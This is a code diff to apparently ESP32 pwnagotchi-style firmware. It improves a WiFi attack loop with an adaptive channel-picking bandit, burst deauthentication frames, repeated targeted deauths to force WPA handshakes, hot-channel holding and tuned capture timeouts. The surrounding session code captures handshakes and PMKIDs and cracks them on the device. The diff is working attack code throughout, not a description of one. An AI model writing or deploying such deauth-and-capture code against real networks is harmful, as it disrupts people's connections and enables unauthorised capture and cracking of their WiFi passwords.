@@ -34,6 +34,7 @@
 #include <esp_wifi.h>
 #include <SD.h>
 #include <vector>
+#include <math.h>
 #include <mbedtls/md.h>
 
 extern DisplayManager displayManager;
@@ -47,10 +48,15 @@ extern WiFiFunctions  wifiFunctions;
 #define PWN_F_PROGRESS  SD_DIR_PWN "/progress.csv"    // bssid,ssid,wordlist_id,next_index
 #define PWN_F_WHITELIST SD_DIR_PWN "/whitelist.csv"   // type,value,label
 #define PWN_F_WORDLIST  SD_DIR_PWN "/wordlist.txt"    // optional user dictionary
+#define PWN_F_LEARN     SD_DIR_PWN "/learn.csv"       // channel,value,count (adaptive roaming)
+#define PWN_F_AIDBG     SD_DIR_PWN "/ai_debug.log"    // human-readable learner trace (`pwn ai debug`)
 
 // ── tunables (draft; see plan §5) ─────────────────────────────────────────────
 static const uint8_t PWN_CHANS[]   = {1, 6, 11};
 #define PWN_RECON_MS       4000
+#define PWN_HOT_MS         12000    // "stay where the action is": after an M1 (a client is handshaking
+                                    // RIGHT NOW), hold this channel & keep kicking it to complete the 4-way
+#define PWN_HOT_MAX        30000    // ...but never camp one stubborn channel longer than this continuously
 #define PWN_MAX_TARGETS    64
 #define PWN_CRACK_SLICE_MS 500      // keep slices short so the UI stays responsive
 #define PWN_RSSI_CUTOFF    (-80)
@@ -638,7 +644,130 @@ static void sendDeauth(const uint8_t* bssid, const uint8_t* client) {
     if (client) memcpy(fr + 4, client, 6);
     memcpy(fr + 10, bssid, 6);
     memcpy(fr + 16, bssid, 6);
-    esp_wifi_80211_tx(WIFI_IF_STA, fr, sizeof(fr), false);
+    // a burst — a single frame is easily missed; a few reliably kick the client
+    for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_STA, fr, sizeof(fr), false); delayMicroseconds(600); }
+}
+
+// ── adaptive channel learner — `pwn ai` [EXP] ────────────────────────────────
+// A per-channel non-stationary bandit (Discounted-UCB). The one decision it makes:
+// "which channel is worth my time?" — exactly the control problem Pwnagotchi's A2C
+// solves (reward = handshakes, levers = channel + dwell), but as ~26 floats instead
+// of a neural net. Every ESP32 pwnagotchi (minigotchi = random(), Marauder = fixed
+// timer) hops blindly; this learns. Forgetting via the discount γ handles a changing
+// area; the UCB √(logN/n) bonus forces re-sampling so a wrong bias self-corrects.
+// NOT "AI" — a textbook bandit. Prior art: Pwnagotchi ai/gym.py (NOTICES #23).
+#define PWN_LEARN_GAMMA 0.95f     // discount: early hits persist ~20 visits (nimble but not amnesiac)
+#define PWN_LEARN_FLOOR 0.5f      // min selection weight for a channel that HOSTS un-captured APs
+#define PWN_SCOUT_FLOOR 0.1f      // min weight for an EMPTY channel — just a periodic "scout" peek so
+                                  // full-13 stops wasting ~⅓ of its time on dead air (captures faster),
+                                  // while still discovering a new/odd-channel AP that appears there
+#define PWN_REWARD_CAP  4.0f      // dwell normaliser for adaptive dwell time
+#define PWN_PRESENCE_W  0.25f     // reward per un-captured AP present on a channel (standing signal)
+#define PWN_PRESENCE_CAP 6        // cap presence count so one crowded channel can't dominate too hard
+static bool  s_aiOn = false;
+static bool  s_aiDebug = false;   // `pwn ai debug` → trace every decision to ai_debug.log
+static float s_lVal[14];          // discounted reward sum   (index = channel 1..13)
+static float s_lCnt[14];          // discounted visit count
+
+static void learnReset() { for (int i = 0; i < 14; i++) { s_lVal[i] = 0; s_lCnt[i] = 0; } }
+// load persisted table, decayed ×0.5 = an extra cross-session discount so old area
+// knowledge is a WEAK prior, not a command (washes out fast if you've moved).
+static void learnLoad() {
+    learnReset();
+    File f = SD.open(PWN_F_LEARN, FILE_READ);
+    if (!f) return;
+    while (f.available()) {
+        String ln = f.readStringUntil('\n'); ln.trim();
+        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1);
+        if (c1 < 0 || c2 < 0) continue;
+        int ch = ln.substring(0, c1).toInt();
+        if (ch < 1 || ch > 13) continue;
+        s_lVal[ch] = ln.substring(c1 + 1, c2).toFloat() * 0.5f;
+        s_lCnt[ch] = ln.substring(c2 + 1).toFloat()   * 0.5f;
+    }
+    f.close();
+}
+static void learnSave() {
+    ScopedPromiscPause _;
+    File f = SD.open(PWN_F_LEARN, FILE_WRITE);   // truncate + rewrite (tiny)
+    if (!f) return;
+    for (int ch = 1; ch <= 13; ch++)
+        if (s_lCnt[ch] > 0.001f) f.printf("%d,%.4f,%.4f\n", ch, s_lVal[ch], s_lCnt[ch]);
+    f.close();
+}
+static void learnUpdate(uint8_t ch, float reward) {   // D-UCB discounted sums
+    if (ch < 1 || ch > 13) return;
+    s_lVal[ch] = PWN_LEARN_GAMMA * s_lVal[ch] + reward;
+    s_lCnt[ch] = PWN_LEARN_GAMMA * s_lCnt[ch] + 1.0f;
+}
+static float learnMean(uint8_t ch) { return (ch >= 1 && ch <= 13 && s_lCnt[ch] > 0.001f) ? s_lVal[ch] / s_lCnt[ch] : 0.0f; }
+// does this channel currently host an un-captured, non-whitelisted AP (i.e. real prey)?
+static bool chHasPrey(uint8_t ch) {
+    for (int i = 0; i < s_nTarg; i++)
+        if (s_targ[i].ch == ch && !s_targ[i].captured && !s_targ[i].wl) return true;
+    return false;
+}
+// per-channel floor: full FLOOR where there's prey, tiny SCOUT_FLOOR on empty channels
+// (cold start = everything empty = uniform scan until APs are found).
+static float chFloor(uint8_t ch) { return chHasPrey(ch) ? PWN_LEARN_FLOOR : PWN_SCOUT_FLOOR; }
+
+// pick the next channel by WEIGHTED-RANDOM selection (probability matching): each
+// channel's weight = mean + floor, pick ∝ weight. A productive channel (high mean)
+// gets most of the visits; the floor keeps every channel at a nonzero probability so a
+// lone/new AP is never starved (the fix for argmax-UCB's 100% camping). The scout floor
+// shrinks empty channels' share so full-13 concentrates capture time on real channels.
+// Cold start (all means 0, no prey) → uniform scan; still beats minigotchi's random().
+static uint8_t learnPick(const uint8_t* set, int n) {
+    float total = 0;
+    for (int i = 0; i < n; i++) total += learnMean(set[i]) + chFloor(set[i]);
+    float r = ((float)(esp_random() % 100000) / 100000.0f) * total;
+    float acc = 0;
+    for (int i = 0; i < n; i++) {
+        acc += learnMean(set[i]) + chFloor(set[i]);
+        if (r <= acc) return set[i];
+    }
+    return set[n - 1];
+}
+static uint8_t learnFavorite(const uint8_t* set, int n) {   // best *known* channel (no bonus) for the HUD
+    float bestM = -1e9f; uint8_t best = set[0];
+    for (int i = 0; i < n; i++) { float m = learnMean(set[i]); if (m > bestM) { bestM = m; best = set[i]; } }
+    return best;
+}
+
+static const char* modeName(PwnMode m);   // defined in the UI section below
+
+// ── debug trace (`pwn ai debug`) — plain-text log so the learner's every decision is
+// inspectable offline for tuning the reward weights / γ / C. Append-only, session
+// header separates runs. Written with promiscuous paused (GDMA rule). Disabled = no cost.
+static void aiDbgSession(PwnMode mode, bool fullChans) {
+    if (!s_aiDebug) return;
+    ScopedPromiscPause _;
+    File f = SD.open(PWN_F_AIDBG, FILE_APPEND);
+    if (!f) return;
+    f.printf("\n=== pwn ai session @%lu  mode=%s chans=%s  gamma=%.2f floor=%.2f scout=%.2f  reward: cap+10 M1+3 newSTA+2 newAP+1 present+%.2f/ap(cap%d)  select=weighted ===\n",
+             (unsigned long)millis(), modeName(mode), fullChans ? "1-13" : "1/6/11", PWN_LEARN_GAMMA, PWN_LEARN_FLOOR, PWN_SCOUT_FLOOR, PWN_PRESENCE_W, PWN_PRESENCE_CAP);
+    f.printf("cols: leave c<ch> rew=<this dwell> mean/cnt=<post-update> | per-channel [m<mean> p<pick prob %%>], * = picked | dwell\n");
+    f.close();
+}
+static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, uint32_t dwell, bool fullChans) {
+    if (!s_aiDebug) return;
+    uint8_t set[13]; int n;
+    if (fullChans) { n = 13; for (int i = 0; i < 13; i++) set[i] = i + 1; }
+    else           { n = (int)sizeof(PWN_CHANS); for (int i = 0; i < n; i++) set[i] = PWN_CHANS[i]; }
+    float totalW = 0; for (int i = 0; i < n; i++) totalW += learnMean(set[i]) + chFloor(set[i]);
+    ScopedPromiscPause _;
+    File f = SD.open(PWN_F_AIDBG, FILE_APPEND);
+    if (!f) return;
+    f.printf("@%lu leave c%-2u rew=%4.1f mean=%.2f cnt=%.1f | ",
+             (unsigned long)ms, leftCh, reward, learnMean(leftCh), s_lCnt[leftCh]);
+    for (int i = 0; i < n; i++) {
+        uint8_t ch = set[i];
+        float w = learnMean(ch) + chFloor(ch);
+        int pct = totalW > 0 ? (int)(100.0f * w / totalW + 0.5f) : 0;
+        f.printf("c%u[m%.2f p%02d]%c", ch, learnMean(ch), pct, ch == picked ? '*' : ' ');
+    }
+    f.printf(" => c%-2u dwell=%lums\n", picked, (unsigned long)dwell);
+    f.close();
 }
 
 // ── UI — the AL-ANQA phoenix mascot (drawn with LGFX primitives) ──────────────
@@ -772,7 +901,14 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     uint32_t apCount = 0, hsCount = 0, pmCount = 0, pwnedCount = 0;
     char ticker[40] = "roaming...";
     char mood[10] = "IDLE";
-    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0, lastMoodEvt = 0, lastM1Ms = 0, gridTxAt = 0;
+    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0, lastMoodEvt = 0, lastM1Ms = 0, gridTxAt = 0, reDeauthAt = 0, learnSaveAt = 0;
+    int attackRot = 0, focusIdx = -1;   // round-robin so each AP gets a focused, collision-free attempt
+    uint8_t  hotChan = 0;               // channel with live handshake (M1) activity — hold & keep trying
+    uint32_t hotUntil = 0, hotStart = 0;
+    if (s_aiOn) learnLoad(); else learnReset();   // adaptive roaming table (decayed on load)
+    if (s_aiOn && s_aiDebug) aiDbgSession(mode, fullChans);
+    float curReward = 0;                // reward accrued on the CURRENT channel this dwell
+    int   apBase = 0, cliBase = 0;      // AP/client counts at dwell start (for new-discovery reward)
     bool running = true;
     char toast[28] = {0};
     uint32_t t0Session = millis();
@@ -804,34 +940,92 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     while (running) {
         uint32_t now = millis();
 
+        // Do NOT hop while a handshake is mid-flight (M1 seen, waiting for M2) — stay on
+        // channel to catch M2 instead of jumping away and losing it (the main capture bug).
+        bool midCapture = s_cap.active && s_cap.haveM1 && !s_cap.haveM2;
+
+        // HOT-CHANNEL HOLD: a client is actively handshaking on this channel (recent M1), so
+        // stay put and keep kicking it to complete the 4-way instead of wandering off — each
+        // M1 refreshes the window (PWN_HOT_MS), capped so we never camp one stubborn channel
+        // forever (PWN_HOT_MAX). This is what turns "saw M1 five times, caught it on the
+        // sixth" into catching it on the first or second.
+        bool hotHold = (curCh == hotChan) && (now < hotUntil) && (now - hotStart < PWN_HOT_MAX);
+
         // channel dwell / hop
-        if (now >= hopAt) {
-            curCh = fullChans ? (uint8_t)(ci + 1) : PWN_CHANS[ci];
+        if (now >= hopAt && !midCapture && !hotHold) {
+            // AI: credit the channel we're LEAVING with what it produced, then let the
+            // bandit choose where to go next (else plain round-robin).
+            uint8_t aiLeftCh = curCh; float aiLeftRew = 0;   // captured for the debug trace
+            if (s_aiOn) {
+                uint8_t setArr[13]; int setN;
+                if (fullChans) { setN = 13; for (int i = 0; i < 13; i++) setArr[i] = i + 1; }
+                else           { setN = (int)sizeof(PWN_CHANS); for (int i = 0; i < setN; i++) setArr[i] = PWN_CHANS[i]; }
+                curReward += 1.0f * (float)(s_nTarg - apBase) + 2.0f * (float)(s_nCli - cliBase); // new APs/clients
+                // STANDING presence reward: a channel that HOSTS un-captured prey keeps
+                // out-scoring an empty one every visit (not just on first discovery) — this
+                // is what makes it converge to where the networks actually live, vs the
+                // discovery-only reward that decays to 0 once the area is mapped.
+                int present = 0;
+                for (int i = 0; i < s_nTarg; i++)
+                    if (s_targ[i].ch == curCh && !s_targ[i].captured && !s_targ[i].wl) present++;
+                if (present > PWN_PRESENCE_CAP) present = PWN_PRESENCE_CAP;
+                curReward += PWN_PRESENCE_W * (float)present;
+                aiLeftRew = curReward;
+                learnUpdate(curCh, curReward);
+                curCh = learnPick(setArr, setN);
+            } else {
+                curCh = fullChans ? (uint8_t)(ci + 1) : PWN_CHANS[ci];
+                ci = (ci + 1) % nChans;
+            }
+            curReward = 0; apBase = s_nTarg; cliBase = s_nCli;   // reset dwell accumulators
             esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
-            // attack this channel's known targets (skip in passive; don't hop mid-capture)
-            if (mode != PWN_PASSIVE && !(s_cap.active && s_cap.haveM1 && !s_cap.haveM2)) {
-                for (int i = 0; i < s_nTarg; i++) {
+            // FOCUS one un-captured target per dwell (rotating). A single capture buffer
+            // means simultaneous handshakes collide, so we work ONE AP at a time like ws.
+            // Like pwnagotchi: PREFER an AP with a KNOWN client (recon → targeted deauth) —
+            //   pass 0 = require a discovered client (directed deauth, most effective),
+            //   pass 1 = active-only fallback to any AP (a client we haven't sampled yet).
+            focusIdx = -1;
+            for (int pass = 0; pass < 2 && focusIdx < 0 && mode != PWN_PASSIVE; pass++) {
+                if (mode == PWN_STEALTH && pass == 1) break;      // stealth never blind-deauths
+                for (int k = 0; k < s_nTarg; k++) {
+                    int i = (attackRot + k) % s_nTarg;
                     if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
                     if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
-                    if (mode == PWN_STEALTH) {
-                        // stealth: ONE directed deauth to a discovered client — no broadcast
-                        // storm. If we haven't seen a client for this AP yet, stay quiet.
-                        const uint8_t* c = cliFor(s_targ[i].bssid);
-                        if (c) { sendDeauth(s_targ[i].bssid, c); break; }
-                    } else {
-                        sendDeauth(s_targ[i].bssid, nullptr);   // active: broadcast
-                    }
+                    const uint8_t* c = cliFor(s_targ[i].bssid);
+                    if (pass == 0 && !c) continue;               // pass 0 needs a known client
+                    sendDeauth(s_targ[i].bssid, c);              // directed if client known, else broadcast
+                    focusIdx = i; attackRot = i + 1; reDeauthAt = now + 900;
+                    break;                                        // one AP this dwell
                 }
             }
-            ci = (ci + 1) % nChans;
-            uint32_t dwell = PWN_RECON_MS + (mode == PWN_STEALTH ? (esp_random() % 1500) : 0); // jitter
+            // adaptive dwell — a productive channel earns up to ~2× the base (Pwnagotchi's
+            // recon_time lever); plain base when AI off.
+            uint32_t dwell = PWN_RECON_MS;
+            if (s_aiOn) {
+                float f = learnMean(curCh) / PWN_REWARD_CAP; if (f > 1.0f) f = 1.0f; if (f < 0) f = 0;
+                dwell = (uint32_t)(PWN_RECON_MS * (1.0f + f));
+            }
+            if (mode == PWN_STEALTH) dwell += esp_random() % 1500;   // jitter
             hopAt = now + dwell;
+            if (s_aiOn && s_aiDebug) aiDbgHop(now, aiLeftCh, aiLeftRew, curCh, dwell, fullChans);
+        }
+
+        // keep kicking the FOCUSED target through the dwell until it hands over a handshake
+        // (mirrors ws's persistence on one AP); paused while a capture is already mid-flight.
+        if (focusIdx >= 0 && focusIdx < s_nTarg && !midCapture && mode != PWN_PASSIVE &&
+            !s_targ[focusIdx].captured && now >= reDeauthAt) {
+            const uint8_t* c = cliFor(s_targ[focusIdx].bssid);
+            if (mode == PWN_STEALTH) { if (c) sendDeauth(s_targ[focusIdx].bssid, c); }
+            else sendDeauth(s_targ[focusIdx].bssid, c);   // directed if client known, else broadcast
+            reDeauthAt = now + 900;
         }
 
         // drain sniffed frames
         char ev = drainOne(curCh);
         if (ev == 'B') { apCount = s_nTarg; }
-        else if (ev == '1') { strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; }
+        else if (ev == '1') { strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; curReward += 3.0f; // M1 = active client
+                              if (hotChan != curCh || now >= hotUntil) hotStart = now;   // start of a fresh hot period
+                              hotChan = curCh; hotUntil = now + PWN_HOT_MS; }             // stay here & keep trying
         else if (ev == '2') { strcpy(mood, "EXCITED"); lastMoodEvt = now; }
         else if (ev == 'G') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // met a grid peer
                               snprintf(ticker, sizeof(ticker), "met %.12s", s_metName); }
@@ -846,6 +1040,13 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             if (now - s_peer[i].lastSeenMs > PWN_PEER_TTL_MS) s_peer[i] = s_peer[--s_nPeer];
             else i++;
 
+        // periodic checkpoint of the learned table (every 2 min) so a crash / power-off
+        // can't cost a session — GDMA-safe (learnSave pauses promiscuous internally).
+        if (s_aiOn) {
+            if (learnSaveAt == 0) learnSaveAt = now + 120000;
+            else if (now >= learnSaveAt) { learnSave(); learnSaveAt = now + 120000; }
+        }
+
         // complete a capture?
         if (s_cap.active && s_cap.haveM1 && (s_cap.haveM2 || s_cap.m1HasPmkid)) {
             bool wasHs = s_cap.haveM2;
@@ -853,13 +1054,16 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
             if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s", s_lastSaveFile + sizeof(SD_DIR_PWN)); }
             else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID captured"); }
-            strcpy(mood, "EXCITED"); lastMoodEvt = now;
+            strcpy(mood, "EXCITED"); lastMoodEvt = now; curReward += 10.0f;   // capture = the payoff
+            hotChan = 0; hotUntil = 0;   // got it — release the hot-hold and move on
         }
 
         // Abandon a stale incomplete capture (an M1 that never got its M2/PMKID). Without
         // this s_cap.active stays set forever and blocks BOTH new captures and idle
         // cracking — the "found APs but stuck on IDLE, never cracks" bug.
-        if (s_cap.active && (now - s_cap.startMs) > 3000) s_cap.active = false;
+        // 6s (was 3s): gives the 4-way time to finish M2 when the target channel is
+        // revisited sparsely (full-13 roam) — 3s dropped handshakes that 1/6/11 caught.
+        if (s_cap.active && (now - s_cap.startMs) > 6000) s_cap.active = false;
 
         // idle → crack a cap for one slice (rotate past solved/exhausted caps).
         // "Idle" = no handshake capture in progress AND not right after a deauth (so a
@@ -870,9 +1074,17 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // an actual M1 so its M2 can land. Deauth alone does NOT block cracking (a deauth
         // with no reconnecting client produces no handshake), so a busy active-mode channel
         // can't starve the cracker.
+        // CRACKING YIELDS TO THE HUNT (capture > crack): while there is un-captured prey in
+        // range we only TRICKLE-crack (one slice every 5s ≈ 10% CPU) so roaming/scouting stays
+        // snappy; when the area is quiet (nothing left to capture) we crack HARD (every 0.7s).
+        // Captures are always crackable later with `cc` / a PC, so nothing is lost by waiting.
+        int preyInRange = 0;
+        for (int i = 0; i < s_nTarg; i++)
+            if (!s_targ[i].captured && !s_targ[i].wl &&
+                (s_targ[i].rssi == 0 || s_targ[i].rssi >= PWN_RSSI_CUTOFF)) preyInRange++;
         bool canCrack = (now - lastM1Ms) > 1200;
         if (canCrack && now >= crackAt) {
-            crackAt = now + 700;
+            crackAt = now + (preyInRange > 0 ? 5000 : 700);   // trickle while hunting, hard when quiet
             std::vector<String> caps;
             if (backlog) {                                 // all caps on disk
                 File d = SD.open(SD_DIR_PWN);
@@ -944,8 +1156,15 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             tft.setTextSize(2); tft.setTextColor(mc, TFT_BLACK); tft.setCursor(RX, BOX_Y); tft.print(mood);
             tft.setTextSize(1);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 24);
-            if (s_nPeer > 0) snprintf(l, sizeof(l), "%-7s ch%-2u g%d", modeName(mode), curCh, s_nPeer);
-            else             snprintf(l, sizeof(l), "%-7s ch%-2u    ", modeName(mode), curCh);
+            if (s_aiOn) {                              // brain readout: current ch + learned favorite
+                uint8_t setA[13]; int setNn;
+                if (fullChans) { setNn = 13; for (int i = 0; i < 13; i++) setA[i] = i + 1; }
+                else           { setNn = (int)sizeof(PWN_CHANS); for (int i = 0; i < setNn; i++) setA[i] = PWN_CHANS[i]; }
+                uint8_t fav = learnFavorite(setA, setNn);
+                snprintf(l, sizeof(l), "c%-2u AI>c%-2u  ", curCh, fav);
+            }
+            else if (s_nPeer > 0) snprintf(l, sizeof(l), "%-7s ch%-2u g%d", modeName(mode), curCh, s_nPeer);
+            else                  snprintf(l, sizeof(l), "%-7s ch%-2u    ", modeName(mode), curCh);
             tft.print(l);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 40); tft.print("SIGNAL");
             for (int i = 0; i < 4; i++) tft.fillRect(RX + i * 14, BOX_Y + 52, 11, 13, i < bars ? TFT_GREEN : PH_ASHDK);
@@ -968,7 +1187,9 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             else { tft.setTextColor(PH_AMBER, TFT_BLACK); snprintf(l, sizeof(l), "> %-40.40s", ticker); }
             tft.setCursor(6, BY); tft.print(l);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(6, BY + 14);
-            snprintf(l, sizeof(l), "[m]mode [c]%s [k]%s [q]quit ", fullChans ? "all" : "1/6/11", backlog ? "all" : "sess");
+            snprintf(l, sizeof(l), "[m]mode [c]%s [k]%s [a]ai:%s [q]quit ",
+                     fullChans ? "all" : "1/6/11", backlog ? "all" : "sess",
+                     s_aiOn ? (s_aiDebug ? "on*" : "on") : "off");   // * = debug trace active
             tft.print(l);
         }
 
@@ -985,6 +1206,11 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         else if (k == 's' || k == 'S') { snprintf(toast, sizeof(toast), "AP%u HS%u PM%u PWN%u", (unsigned)apCount,
                                          (unsigned)hsCount, (unsigned)pmCount, (unsigned)pwnedCount);
                                          toastUntil = now + 2000; drawAt = 0; }
+        else if (k == 'a' || k == 'A') { s_aiOn = !s_aiOn;             // live toggle for A/B testing —
+                                         // KEEP the in-RAM learned table (do NOT reload from disk, which
+                                         // would clobber a session's learning with the stale file).
+                                         snprintf(toast, sizeof(toast), "adaptive roam: %s", s_aiOn ? "ON" : "off");
+                                         toastUntil = now + 1500; drawAt = 0; }
 
         vTaskDelay(pdMS_TO_TICKS(5));
     }
@@ -993,6 +1219,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     s_sniffing = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
+    if (s_aiOn) learnSave();   // persist the learned channel table (promiscuous now off)
     WiFi.mode(WIFI_STA);
     if (haveSpr) phx.deleteSprite();
     dm.clearScreen();
@@ -1090,6 +1317,8 @@ void runPwn(char* args) {
     if (argHas(args, "passive")) mode = PWN_PASSIVE;
     else if (argHas(args, "stealth")) mode = PWN_STEALTH;
     bool full = argHas(args, "full");
+    s_aiDebug = argHas(args, "debug");        // `pwn ai debug` → trace decisions to ai_debug.log
+    s_aiOn = argHas(args, "ai") || s_aiDebug; // `pwn ai [mode] [full]` — adaptive roaming [EXP]; toggle live with [a]
 
     runPwnSession(mode, full, /*backlog*/ true);
 }
